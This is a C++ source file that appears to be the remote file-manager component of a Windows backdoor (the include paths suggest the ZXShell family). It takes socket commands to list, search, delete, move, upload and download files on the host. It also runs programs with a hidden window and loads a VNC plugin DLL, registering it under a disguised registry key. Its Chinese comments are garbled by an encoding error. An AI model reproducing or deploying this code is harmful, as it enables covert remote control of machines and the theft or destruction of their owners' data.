// FileManager.cpp: implementation of the CFileManager class.
// Զ���ļ�����
//////////////////////////////////////////////////////////////////////

#include "FileManager.h"
#include "..\zxsCommon\zxsWinAPI.h"

#include "..\zxsCommon\MD5Class\MD5A.cpp"
#include "..\zxsCommon\MD5Class\XMD5.cpp"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

bool FindFile(char *lpFileName, LP_MG_FILE_INFO pFI)//�ж��ļ��Ƿ����
{
	WIN32_FIND_DATA  FileData;
	HANDLE hSearch = ZXSAPI::FindFirstFile(lpFileName, &FileData);
	if(hSearch == INVALID_HANDLE_VALUE)
		return false;
	FindClose(hSearch);
	pFI->dwFileAttributes = FileData.dwFileAttributes;
	pFI->ftCreationTime   = FileData.ftCreationTime;
	pFI->ftLastAccessTime = FileData.ftLastAccessTime;
	pFI->ftLastWriteTime  = FileData.ftLastWriteTime;
	pFI->nFileSize        = (FileData.nFileSizeHigh * ((__int64)MAXDWORD+1)) + FileData.nFileSizeLow;
	strcpy(pFI->szFileName, FileData.cFileName);

	return true;
}

bool ChangeFileAttributes(char *lpFileName, LP_MG_FILE_INFO pFI)//�����ļ����ԣ�����ʱ����Ϣ
{
	bool result;
	HANDLE hFile = ZXSAPI::CreateFile(lpFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ|FILE_SHARE_DELETE,
		NULL,
		OPEN_EXISTING,
		(pFI->dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)? FILE_FLAG_BACKUP_SEMANTICS : FILE_ATTRIBUTE_NORMAL,
		NULL);
	if(hFile == INVALID_HANDLE_VALUE){
		return false;
	}
	result = SetFileTime(hFile,
		&pFI->ftCreationTime,
		&pFI->ftLastAccessTime,
		&pFI->ftLastWriteTime);
	if(!result)
		goto exit;
	result = SetFileAttributes(lpFileName, pFI->dwFileAttributes);
	if(!result)
		goto exit;

exit:
	CloseHandle(hFile);
	return result;
}

CFileManager::CFileManager()
{
	memset(this, 0, sizeof(CFileManager));
}

CFileManager::~CFileManager()
{
	closesocket(Socket);
}

void CFileManager::Init(SOCKET s)
{
	Socket = s;
}

void CFileManager::SendErr(DWORD errcode)
{
	DataSend(Socket, (char*)&errcode, sizeof(DWORD));
}

BOOL CFileManager::CaseCmd(char *CMD, char *Msg)
{
	return !stricmp(CMD, Msg);
}
int CFileManager::ParseCMD(char *pCmdLine)
{
	char CMD[MAX_PATH], szParam[MAX_PATH];
	memset(CMD, 0, sizeof(CMD));
	memset(szParam, 0, sizeof(szParam));

	const char *p = TakeOutStringByChar(pCmdLine, CMD, MAX_PATH, ' ');
	if(p)
		_snprintf(szParam, sizeof(szParam), "%s", p);

	if(CaseCmd(CMD, "QUIT"))
	{
		SendErr(0);
		return 0;
	}else if(CaseCmd(CMD, "LIST"))
	{
		CMD_LIST(szParam);
	}else if(CaseCmd(CMD, "DELE"))
	{
		CMD_DELE(szParam);
	}else if(CaseCmd(CMD, "MOVE"))
	{
		CMD_MOVE(szParam);
	}else if(CaseCmd(CMD, "RNTO"))
	{
		CMD_RNTO(szParam);
	}else if(CaseCmd(CMD, "EXEC"))
	{
		CMD_EXEC(szParam);
	}else if(CaseCmd(CMD, "REST"))
	{
		CMD_REST(szParam);
	}else if(CaseCmd(CMD, "SIZE"))
	{
		CMD_SIZE(szParam);
	}else if(CaseCmd(CMD, "RETR"))
	{
		CMD_RETR(szParam);
	}else if(CaseCmd(CMD, "STOR"))
	{
		CMD_STOR(szParam);
	}else if(CaseCmd(CMD, "FILE"))
	{
		CMD_FILE(szParam);
	}else if(CaseCmd(CMD, "XMKD"))
	{
		CMD_XMKD(szParam);
	}
	else if(CaseCmd(CMD, "XMD5"))
	{
		CMD_XMD5(szParam);
	}
	else if(CaseCmd(CMD, "PLUG_vnc"))
	{
		CMD_PLUG_vnc(szParam);
	}
	else if(CaseCmd(CMD, "SEARCH"))
	{
		CMD_SEARCH(szParam);
	}else
	{
		SendErr(ERROR_BAD_COMMAND);
	}

	return 1;
}
//����Ŀ¼�ļ��б�
int CFileManager::CMD_LIST(char *szParam)
{
	MG_FILE_INFO FI;
	int FileNameLen;
	memset(&FI, 0xff, sizeof(MG_FILE_INFO));

	if(strlen(szParam) == 0)
	{
		SendErr(0);
		for(int i=0;i<26;++i) 
		{
			FileNameLen = sprintf(FI.szFileName,"%c:",'A'+i);
			UINT uType=GetDriveType(FI.szFileName);

			if(uType!=1)
			{
				FI.dwFileAttributes = uType;
				DataSend(Socket, (char*)&FI, len_head_FileInfo+FileNameLen+1);
			}
		}
		memset(&FI, 0, sizeof(MG_FILE_INFO));
		DataSend(Socket, (char*)&FI, len_head_FileInfo);
	}else
	{

		int idx = 0,nFiles=0, len=0, ret = 0;
		char lpFileName[MAX_PATH];
		WIN32_FIND_DATA wfd;
		int nCount_Dir, i;

		sprintf(lpFileName, "%s\\*.*", szParam);

		HANDLE hFile = ZXSAPI::FindFirstFile(lpFileName, &wfd);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			SendErr(GetLastError());
			return -1;
		}
		sprintf(CurrPath, "%s\\", szParam);//��Ч·��������Ϊ��ǰ·��

		SendErr(0);
		do{
			if(!stricmp(wfd.cFileName, ".") || !stricmp(wfd.cFileName, ".."))
				continue;
			FI.dwFileAttributes = wfd.dwFileAttributes;
			FI.ftCreationTime   = wfd.ftCreationTime;
			FI.ftLastAccessTime = wfd.ftLastAccessTime;
			FI.ftLastWriteTime  = wfd.ftLastWriteTime;
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				FI.nFileSize = (__int64)-1;
			else
				FI.nFileSize = (wfd.nFileSizeHigh * ((__int64)MAXDWORD+1)) + wfd.nFileSizeLow;

			FileNameLen = sprintf(FI.szFileName, "%s", wfd.cFileName);
			//len_head_FileInfoΪ�ļ���Ϣ�ṹ��ǰ�����Ա�Ĵ�С�����������һ�����������ļ����ĳ��ȣ�ʵ�ʷ��ͳ���Ϊlen_head_FileInfo+FileNameLen+1�����ַ�
			if(DataSend(Socket, (char*)&FI, len_head_FileInfo+FileNameLen+1) != len_head_FileInfo+FileNameLen+1)
				break;
			nFiles++;
		}while(FindNextFile(hFile, &wfd));

		memset(&FI, 0, sizeof(MG_FILE_INFO));
		DataSend(Socket, (char*)&FI, len_head_FileInfo);//��սṹ����Ϊ������־

		FindClose(hFile);
		return nFiles;
	}
	return 0;
}


int WINAPI SendFIStruct(int DataType, BYTE *buffer, int datalen, void *lParam)
{
	if(DataSend((SOCKET)lParam, (char*)buffer, datalen) != datalen)
		return 0;
	return 1;
}

int WINAPI DeleteAllFile(int DataType, BYTE *buffer, int datalen, void *lParam)
{
	int ret, bAttrReSeted = false;
	DWORD *myParam = (DWORD *)lParam;

	CFileManager *pFileMG = (CFileManager *)(myParam[0]);

	LP_MG_FILE_INFO pFI = (LP_MG_FILE_INFO)buffer;

	char FullPath[MAX_PATH];
	sprintf(FullPath, "%s\\%s", pFileMG->GetCurrDir(), pFI->szFileName);

	if(pFI->dwFileAttributes & FILE_ATTRIBUTE_READONLY)
	{
		bAttrReSeted = SetFileAttributes(FullPath, FILE_ATTRIBUTE_NORMAL);
	}

	if(pFI->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
	{
		ret = ZXSAPI::RemoveDirectory(FullPath);
	}else
	{
		ret = DeleteFile(FullPath);
	}

	if(ret)
		myParam[1]++;
	else if(!ret && bAttrReSeted)
		SetFileAttributes(FullPath, pFI->dwFileAttributes);

	return 1;
}

int CFileManager::CMD_DELE(char *szParam)
{

	int ret = 0;

/*	DWORD dwAttrs = GetFileAttributes(szParam);
	ret = SetFileAttributes(szParam, FILE_ATTRIBUTE_NORMAL);

	SHFILEOPSTRUCT FileOp;
	ZeroMemory(&FileOp,sizeof(FileOp));
	FileOp.fFlags = FOF_NOCONFIRMMKDIR|FOF_NOCONFIRMATION|FOF_RENAMEONCOLLISION|FOF_SILENT|FOF_NOERRORUI;
	FileOp.hNameMappings = NULL;
	FileOp.hwnd = NULL;
	FileOp.lpszProgressTitle = NULL;
	FileOp.pFrom = szParam;
	FileOp.pTo = NULL;
	FileOp.wFunc = FO_DELETE;
	ret = SHFileOperation(&FileOp);
	SendErr(ret);
	if(ret != 0)
		SetFileAttributes(szParam, dwAttrs);
*/

	char   drive[_MAX_DRIVE];   
	char   dir[_MAX_DIR];   
	char   fname[_MAX_FNAME];   
	char   ext[_MAX_EXT];   
	char   szFileName[MAX_PATH];

	_splitpath(szParam, drive, dir, fname, ext);//�ֽ�·��

	sprintf(szFileName, "%s%s", drive, dir);
	//���û�Ŀ¼
	SetCurrDir(szFileName);
	sprintf(szFileName, "%s%s", fname, ext);

	DWORD myParam[2];
	myParam[0] = (DWORD)this;
	myParam[1] = 0;//��������ɾ�����ļ���Ŀ

	int nFiles = SearchAllFile(szFileName, false, DeleteAllFile, myParam, 0);

	SendErr(nFiles == myParam[1] ? 0 : ERROR_ACCESS_DENIED);

	return ret;
}

int CFileManager::CMD_MOVE(char *szParam)
{
	ARGWTOARGVA arg(szParam);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	if(argc != 2)
	{
		SendErr(ERROR_INVALID_PARAMETER);
		return 0;
	}
	char From[MAX_PATH]={0};
	char To[MAX_PATH]={0};

	sprintf(From, "%s", argv[0]);
	sprintf(To, "%s", argv[1]);

	int ret;
	SHFILEOPSTRUCT FileOp;
	ZeroMemory(&FileOp,sizeof(FileOp));

	FileOp.fFlags = FOF_NOCONFIRMMKDIR|FOF_NOCONFIRMATION|FOF_RENAMEONCOLLISION|FOF_SILENT|FOF_NOERRORUI;
	FileOp.hNameMappings = NULL;
	FileOp.hwnd = NULL;
	FileOp.lpszProgressTitle = NULL;
	FileOp.pFrom = From;
	FileOp.pTo = To;
	FileOp.wFunc = FO_MOVE;
	ret = SHFileOperation(&FileOp);
	SendErr(ret);

	return ret;
}

int CFileManager::CMD_RNTO(char *szParam)
{
	ARGWTOARGVA arg(szParam);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	if(argc != 2)
	{
		SendErr(ERROR_INVALID_PARAMETER);
		return 0;
	}
	int ret;

	ret = ZXSAPI::MoveFile(argv[0], argv[1]);
	SendErr(ret?0:GetLastError());
	return ret;
}

//���ָ�����ļ�����Ϣ��Ŀ¼�Ļ�������������е��ļ�
int CFileManager::SearchAllFile(char *FileName, bool bRecursion, FindFileCallBack pFunCallback, LPVOID lParam, int callflag)
{
	if(IsAbort())
		return -1;

	MG_FILE_INFO FI;
	int FileNameLen;

	int idx = 0,nFiles=0, len=0, ret = 0;
	char lpFileName[MAX_PATH];
	WIN32_FIND_DATA wfd;
	int nCount_Dir, i;

	if(bRecursion)
		sprintf(TempBuf, "%s\\%s\\*.*", CurrPath, FileName);
	else
		sprintf(TempBuf, "%s\\%s", CurrPath, FileName);

	FormatPathString(TempBuf, lpFileName, MAX_PATH, true);//��ʽ��·������c:\aaa\bbb\\\..\\ccc ���Ϊc:\aaa\ccc

	HANDLE hFile = ZXSAPI::FindFirstFile(lpFileName, &wfd);
	if (hFile == INVALID_HANDLE_VALUE)
		return 0;

	do{
		if(!stricmp(wfd.cFileName, ".") || !stricmp(wfd.cFileName, ".."))
			continue;
		FI.dwFileAttributes = wfd.dwFileAttributes;
		FI.ftCreationTime   = wfd.ftCreationTime;
		FI.ftLastAccessTime = wfd.ftLastAccessTime;
		FI.ftLastWriteTime  = wfd.ftLastWriteTime;
		FI.nFileSize = (wfd.nFileSizeHigh * ((__int64)MAXDWORD+1)) + wfd.nFileSizeLow;
		
		//FI.szFileName = FileName\\SubFileName �ݹ��Դ�����
		if(bRecursion)
			FileNameLen = sprintf(FI.szFileName, "%s\\%s", FileName, wfd.cFileName);
		else
			FileNameLen = sprintf(FI.szFileName, "%s", FileName);

		//callflag��ʾ�ص��������ڽ���Ŀ¼ǰ���û��ǵݹ���Ŀ¼���ٵ���
		if(callflag)
		{
			if(!pFunCallback(0, (BYTE*)&FI, len_head_FileInfo+FileNameLen+1, lParam))
				break;
		}

		nFiles++;
		if(FI.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			//lpFileName = FileName\DirectoryName
			if(bRecursion)
				sprintf(lpFileName, "%s\\%s", FileName, wfd.cFileName);
			else
				sprintf(lpFileName, "%s", FileName);
			ret = SearchAllFile(lpFileName, true, pFunCallback, lParam, callflag);
			if(ret == -1)
				return -1;

			nFiles += ret;
			
		}

		if(!callflag)
		{
			if(!pFunCallback(0, (BYTE*)&FI, len_head_FileInfo+FileNameLen+1, lParam))
				break;
		}

	}while(FindNextFile(hFile, &wfd));

	FindClose(hFile);
	return nFiles;
}

void CFileManager::SetCurrDir(char *path)
{
	int len = FormatPathString(path, CurrPath, MAX_PATH, true);
	if(CurrPath[len-1] == '\\')
		CurrPath[len-1] = '\0';
}

BOOL CFileManager::IsWritable(char *LocalFile)
{
	DWORD fattr = GetFileAttributes(LocalFile);

	SetFileAttributes(LocalFile, FILE_ATTRIBUTE_NORMAL);

	HANDLE hFile = ZXSAPI::CreateFile(LocalFile, 
        GENERIC_WRITE, 
        FILE_SHARE_WRITE, 
        NULL, 
        OPEN_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
	if(hFile == INVALID_HANDLE_VALUE){
		SetFileAttributes(LocalFile, fattr);
		return FALSE;
	}

	SetFileAttributes(LocalFile, fattr);
	CloseHandle(hFile);
	return TRUE;
}

int CFileManager::SendFileInfo(char *lpFilePath)
{
	char   drive[_MAX_DRIVE];   
	char   dir[_MAX_DIR];   
	char   fname[_MAX_FNAME];   
	char   ext[_MAX_EXT];   
	char   szFileName[MAX_PATH];
	char   szCurrDir_bak[MAX_PATH];

	_splitpath(lpFilePath, drive, dir, fname, ext);//�ֽ�·��

	sprintf(szFileName, "%s%s", drive, dir);

	sprintf(szCurrDir_bak, "%s", GetCurrDir());
	SetCurrDir(szFileName);

	sprintf(szFileName, "%s%s", fname, ext);

	int nFiles = SearchAllFile(szFileName, false, SendFIStruct, (LPVOID)Socket, 1);//1��ʾ���ҵ�Ŀ¼ʱ���̵���SendFIStruct�������ǵݹ����ļ����ٵ���

	SetCurrDir(szCurrDir_bak);

	memset(szFileName, 0, sizeof(szFileName));
	DataSend(Socket, szFileName, len_head_FileInfo);

	return nFiles;
}

//���ָ���ļ���Ϣ������, CMD_FILE->SendFileInfo->SearchAllFile
int CFileManager::CMD_FILE(char *szParam)
{
	int ret;
	char szFileName[MAX_PATH];
	MG_FILE_INFO FI;

	if(!FindFile(szParam, &FI))
	{
		SendErr(ERROR_FILE_NOT_FOUND);
		return 0;
	}
	SendErr(0);

	return SendFileInfo(szParam);
}

//�����ļ�������㣬���ڶϵ�����
int CFileManager::CMD_REST(char *szParam)
{
	Marker = _atoi64(szParam);
	SendErr(0);
	return Marker;
}

//����ļ���С
int CFileManager::CMD_SIZE(char *szParam)
{
	int ret;
	char szFileName[MAX_PATH];
	MG_FILE_INFO FI;

	memset(&FI, 0, sizeof(FI));

	sprintf(szFileName, "%s\\%s", CurrPath, szParam);

	FindFile(szFileName, &FI);

	DataSend(Socket, (char*)&FI.nFileSize, sizeof(__int64));

	return 1;
}

//ִ��һ������
int CFileManager::CMD_EXEC(char *szParam)
{
	if(ZXSAPI::WinExec(szParam, SW_HIDE) > 32) 
		SendErr(0);
	else  
		SendErr(GetLastError());
	return 1;
}

//�½��ļ���
int CFileManager::CMD_XMKD(char *szParam)
{
	int ret;
	char szFileName[MAX_PATH];

	sprintf(szFileName, "%s\\%s", CurrPath, szParam);
	ret = CreateDirectory(szFileName, NULL);
	SendErr(ret?0:GetLastError());
	return ret;
}

//����
int CFileManager::CMD_RETR(char *szParam)
{
	int ret = 0;
	char szFileName[MAX_PATH];
	MG_FILE_INFO FI;
	__int64 FilePos = Marker;
	Marker = 0;

	sprintf(szFileName, "%s\\%s", CurrPath, szParam);

	if(!FindFile(szFileName, &FI))
	{
		SendErr(ERROR_FILE_NOT_FOUND);
		return 0;
	}
	//̽���ļ��Ƿ����ֻ����
	HANDLE hFile = ZXSAPI::CreateFile(szFileName, 
        GENERIC_READ, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
	if(hFile == INVALID_HANDLE_VALUE){
		SendErr(GetLastError());
		return false;
	}
	CloseHandle(hFile);
	SendErr(0);
/*
	FI.nFileSize -= FilePos;
	if(! DataSend(Socket, (char*)&FI, len_head_FileInfo))
		return 0;
*/
	if(FI.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
	{
		return 1;
	}else
	{
		if(SendFileData(Socket, szFileName, FilePos) == -1)
			return 0;
		SendErr(0);
	}
	return ret;
}

//�ϴ�
int CFileManager::CMD_STOR(char *szParam)
{
	int ret;
	char szFileName[MAX_PATH];
	MG_FILE_INFO FI;

	sprintf(szFileName, "%s\\%s", CurrPath, szParam);

	if(!IsWritable(szFileName))
	{
		SendErr(GetLastError());
		return 0;
	}

	SendErr(0);
	if(! RecvMessage(Socket, (char*)&FI, len_head_FileInfo, -1))
	{
		//closesocket(Socket);//
		return 0;
	}

	if(! RecvFileData(Socket, szFileName, FI.nFileSize))
	{
		//closesocket(Socket);//
		return 0;
	}
	ChangeFileAttributes(szFileName, &FI);

	return 1;
}

BOOL CFileManager::IsAbort()//ִ��ָ���ڼ�����ж�ָ��
{
	int Result;
	char CMD[32];
	fd_set FdRead;
	struct timeval TimeOut = {0, 0};
	FD_ZERO(&FdRead);
	FD_SET(Socket,&FdRead);
	Result = select(0, &FdRead, NULL, NULL, &TimeOut);
	if(Result == 0)
		return FALSE;

	Result = recv(Socket, CMD, 6, MSG_PEEK);
	if(Result <= 0)
		return TRUE;

	if(Result == 6 && CaseCmd(CMD, "ABOR\r\n"))
	{
		recv(Socket, CMD, 6, 0);
		return TRUE;
	}

	return FALSE;
}

//�����ļ���MD5Ч��ֵ
int CFileManager::CMD_XMD5(char *szParam)
{
	char szBuf[MAX_PATH] = {0};

	XMD5 Md5File;

	if(! Md5File.Open(szParam))
	{
		SendErr(ERROR_FILE_NOT_FOUND);
		return 0;
	}

	while(Md5File.HashFile())
	{
		//�����ж�ָ��
		if(IsAbort())
		{
			goto abort;
		}
	}

	SendErr(ERROR_SUCCESS);
	Md5File.GetFileMD5String(szBuf);
	DataSend(Socket, szBuf, 32+1);
	Md5File.Close();
	return 1;
abort:
	SendErr(ERROR_CANCELLED);
	Md5File.Close();
	return 0;
}

int CFileManager::CMD_PLUG_vnc(char *szParam)
{
	char szBuf[MAX_PATH] = {0};

	HINSTANCE hDll = ZXSAPI::LoadLibraryEx(szParam, NULL, LOAD_LIBRARY_AS_DATAFILE);
	if(!hDll)
	{
		SendErr(ERROR_BAD_FORMAT);
		return 0;
	}
	FreeLibrary(hDll);
	hDll = ZXSAPI::LoadLibrary(szParam);
	if(!hDll)
	{
		SendErr(ERROR_BAD_FORMAT);
		return 0;
	}
	if(!ZXSAPI::GetProcAddress(hDll, "WinVnc"))
	{
		SendErr(ERROR_INVALID_DATA);
		return 0;
	}
//HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
	int ret = WriteReg(HKEY_LOCAL_MACHINE, 
		"SYSTEM\\CurrentControlSet\\Control\\zxplug",
		"telhelp",
		REG_SZ,
		szParam,
		0,
		0);
	if(ret)
		SendErr(ERROR_SUCCESS);
	else
		SendErr(ERROR_CANTWRITE);

	return ret;
}


int WINAPI SearchFileProc(int DataType, BYTE *buffer, int datalen, void *lParam)
{
	int ret, bAttrReSeted = false;
	DWORD *myParam = (DWORD *)lParam;
	
	CFileManager *pFileMG = (CFileManager *)(myParam[0]);
	SOCKET Socket = (SOCKET)(myParam[1]);
	char *lpMatchStr = (char*)(myParam[2]);
	
	LP_MG_FILE_INFO pFI = (LP_MG_FILE_INFO)buffer;
	
	if(PathMatchSpec(pFI->szFileName, lpMatchStr))
	{
		if(DataSend(Socket, (char*)buffer, datalen) != datalen)
			return 0;
	}

	return 1;
}

int CFileManager::CMD_SEARCH(char *szParam)
{
	char   szFileName[MAX_PATH];
	
	DWORD myParam[3];

	myParam[0] = (DWORD)this;
	myParam[1] = (DWORD)Socket;
	myParam[2] = (DWORD)szParam;

	int nFiles = SearchAllFile("", true, SearchFileProc, (LPVOID)myParam, 1);//1��ʾ���ҵ�Ŀ¼ʱ���̻ص��������ǵݹ����ļ����ٵ���

	memset(szFileName, 0, sizeof(szFileName));
	DataSend(Socket, szFileName, len_head_FileInfo);

	return nFiles;
}
